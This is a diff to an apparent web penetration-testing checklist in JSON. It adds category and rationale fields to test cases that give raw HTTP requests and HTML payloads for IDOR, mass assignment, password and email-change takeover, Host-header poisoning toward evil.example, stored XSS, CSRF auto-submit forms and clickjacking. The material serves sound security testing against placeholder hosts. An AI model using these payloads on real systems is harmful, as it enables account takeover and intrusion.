@@ -32,19 +32,25 @@
               "name": "Swap the path id",
               "kind": "request",
               "payload": "GET /users/1002 HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
-              "expect": "1002 belongs to B. Also /profile?id=1002, /api/v1/users/1002, /settings/1002."
+              "expect": "1002 belongs to B. Also /profile?id=1002, /api/v1/users/1002, /settings/1002.",
+              "category": "authorization-context",
+              "why": "Reads another user's object with your own session; a 200 with their data is the finding."
             },
             {
               "name": "Numeric walk",
               "kind": "request",
               "payload": "GET /api/v1/users/1000 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>",
-              "expect": "1000, 1001, 1002. A 200 for another account is the finding. Stop after a few hits."
+              "expect": "1000, 1001, 1002. A 200 for another account is the finding. Stop after a few hits.",
+              "category": "authorization-context",
+              "why": "Sequential ids let one read sweep the whole object space cheaply."
             },
             {
               "name": "Opaque id / UUID",
               "kind": "request",
               "payload": "GET /api/v1/users/11111111-1111-1111-1111-111111111111 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>",
-              "expect": "Guessing is harder; still try B's real UUID captured from an invite, share link, or search."
+              "expect": "Guessing is harder; still try B's real UUID captured from an invite, share link, or search.",
+              "category": "encoding",
+              "why": "Opaque ids are not a control; swapping one still requires a direct authorization check."
             }
           ]
         },
@@ -64,13 +70,17 @@
               "name": "PATCH the other id",
               "kind": "request",
               "payload": "PATCH /api/v1/users/1002 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"name\":\"wapt-marker\"}",
-              "expect": "Read back as B. Also try POST /users/1002/delete and DELETE /users/1002."
+              "expect": "Read back as B. Also try POST /users/1002/delete and DELETE /users/1002.",
+              "category": "authorization-context",
+              "why": "Writes are where IDOR turns destructive; mutating another user's object from a low account is the finding."
             },
             {
               "name": "Body id retarget",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"id\":1002,\"email\":\"attacker@example.com\"}",
-              "expect": "Body id must not retarget the update. Also try user_id, account_id, uuid."
+              "expect": "Body id must not retarget the update. Also try user_id, account_id, uuid.",
+              "category": "parameter-variant",
+              "why": "The id in the body may not be the one the route binds, so a body retarget slips past a path-level check."
             }
           ]
         },
@@ -90,13 +100,17 @@
               "name": "Hidden privilege fields",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <member-token>\nContent-Type: application/json\n\n{\"role\":\"admin\",\"isAdmin\":true,\"verified\":true,\"balance\":9999}",
-              "expect": "Read the object back. role/isAdmin/verified/balance/tenant_id must be unchanged."
+              "expect": "Read the object back. role/isAdmin/verified/balance/tenant_id must be unchanged.",
+              "category": "parameter-variant",
+              "why": "Extra form fields map to model properties the UI never exposes."
             },
             {
               "name": "Ownership reassignment",
               "kind": "request",
               "payload": "PATCH /api/v1/projects/55 HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"owner_id\":1002,\"user_id\":1002}",
-              "expect": "Must not move the object to B (or take B's object)."
+              "expect": "Must not move the object to B (or take B's object).",
+              "category": "authorization-context",
+              "why": "Setting owner_id lets one account claim another's object."
             }
           ]
         }
@@ -123,13 +137,17 @@
               "name": "Omit current password",
               "kind": "request",
               "payload": "POST /account/password HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>\nContent-Type: application/json\n\n{\"password\":\"NewPass1!\",\"new_password\":\"NewPass1!\"}",
-              "expect": "Must fail. Also try current_password=wrong."
+              "expect": "Must fail. Also try current_password=wrong.",
+              "category": "authentication-context",
+              "why": "If the current secret is optional, a CSRF or stolen session can change the password."
             },
             {
               "name": "Swap target account",
               "kind": "request",
               "payload": "POST /account/password HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>\nContent-Type: application/json\n\n{\"user_id\":1002,\"current_password\":\"A-password\",\"new_password\":\"NewPass1!\"}",
-              "expect": "Must change A, not B."
+              "expect": "Must change A, not B.",
+              "category": "authorization-context",
+              "why": "A change endpoint that accepts an account identifier enables cross-account password change."
             }
           ]
         },
@@ -148,13 +166,17 @@
               "name": "Direct email PATCH",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"email\":\"attacker@example.com\"}",
-              "expect": "Must stay pending until the new inbox confirms. A silent swap is the finding."
+              "expect": "Must stay pending until the new inbox confirms. A silent swap is the finding.",
+              "category": "authorization-context",
+              "why": "Setting the email directly with no confirm flow is a one-step account-takeover primitive."
             },
             {
               "name": "Host-poisoned confirm",
               "kind": "request",
               "payload": "POST /account/email HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: evil.example\nCookie: session=<account-A>\nContent-Type: application/json\n\n{\"email\":\"tester@example.com\"}",
-              "expect": "Confirm mail must still point at the canonical origin."
+              "expect": "Confirm mail must still point at the canonical origin.",
+              "category": "header-variant",
+              "why": "A poisoned Host in the confirmation link redirects the verify request to an attacker-controlled host."
             }
           ]
         },
@@ -174,13 +196,17 @@
               "name": "HTML in bio",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"bio\":\"<img src=x onerror=alert(1)>\",\"name\":\"<svg/onload=alert(1)>\"}",
-              "expect": "View as B and in any admin/moderation queue. Self-XSS alone is not enough."
+              "expect": "View as B and in any admin/moderation queue. Self-XSS alone is not enough.",
+              "category": "browser-context",
+              "why": "A profile field rendered as HTML executes in another user's session."
             },
             {
               "name": "Markdown / rich text",
               "kind": "request",
               "payload": "PATCH /api/v1/users/me HTTP/1.1\nHost: www.example.com\nAuthorization: Bearer <account-A-token>\nContent-Type: application/json\n\n{\"bio\":\"[ok](javascript:alert(1))\\n<img src=x onerror=alert(1)>\"}",
-              "expect": "Markdown and sanitizer bypasses are the same class. Confirm in the rendered page."
+              "expect": "Markdown and sanitizer bypasses are the same class. Confirm in the rendered page.",
+              "category": "technology-specific",
+              "why": "Sanitised markdown/rich-text can carry allowed-but-unsafe constructs past a filter."
             }
           ]
         },
@@ -200,13 +226,17 @@
               "name": "Cross-site email change",
               "kind": "html",
               "payload": "<form action=\"https://www.example.com/account/email\" method=\"POST\">\n  <input name=\"email\" value=\"attacker@example.com\">\n</form>\n<script>document.forms[0].submit()</script>",
-              "expect": "Must fail without a valid CSRF token. SameSite=Lax does not stop POST on some older browsers — still require a token."
+              "expect": "Must fail without a valid CSRF token. SameSite=Lax does not stop POST on some older browsers — still require a token.",
+              "category": "browser-context",
+              "why": "A state-changing POST issued from another origin is the CSRF primitive."
             },
             {
               "name": "JSON as text/plain",
               "kind": "request",
               "payload": "POST /api/v1/users/me HTTP/1.1\nHost: www.example.com\nContent-Type: text/plain\nOrigin: https://evil.example\nCookie: session=<victim>\n\n{\"email\":\"attacker@example.com\"}",
-              "expect": "Must not change state. This is the classic simple-request CSRF shape."
+              "expect": "Must not change state. This is the classic simple-request CSRF shape.",
+              "category": "browser-context",
+              "why": "A simple-request JSON POST can be sent cross-site without a preflight, so it must still require a token."
             }
           ]
         },
@@ -225,13 +255,17 @@
               "name": "Read framing headers",
               "kind": "request",
               "payload": "GET /settings HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
-              "expect": "Content-Security-Policy: frame-ancestors 'none' (or an explicit allowlist). X-Frame-Options: DENY or SAMEORIGIN."
+              "expect": "Content-Security-Policy: frame-ancestors 'none' (or an explicit allowlist). X-Frame-Options: DENY or SAMEORIGIN.",
+              "category": "baseline",
+              "why": "frame-ancestors and X-Frame-Options decide whether the page can be framed at all."
             },
             {
               "name": "Cross-origin iframe",
               "kind": "html",
               "payload": "<!doctype html>\n<title>frame test</title>\n<iframe src=\"https://www.example.com/settings\" style=\"width:100%;height:100%\"></iframe>",
-              "expect": "The iframe stays blank / errors when frame-ancestors or XFO is set. If settings render, framing is allowed."
+              "expect": "The iframe stays blank / errors when frame-ancestors or XFO is set. If settings render, framing is allowed.",
+              "category": "browser-context",
+              "why": "An actual cross-origin frame load proves or disproves the header reading."
             }
           ]
         }
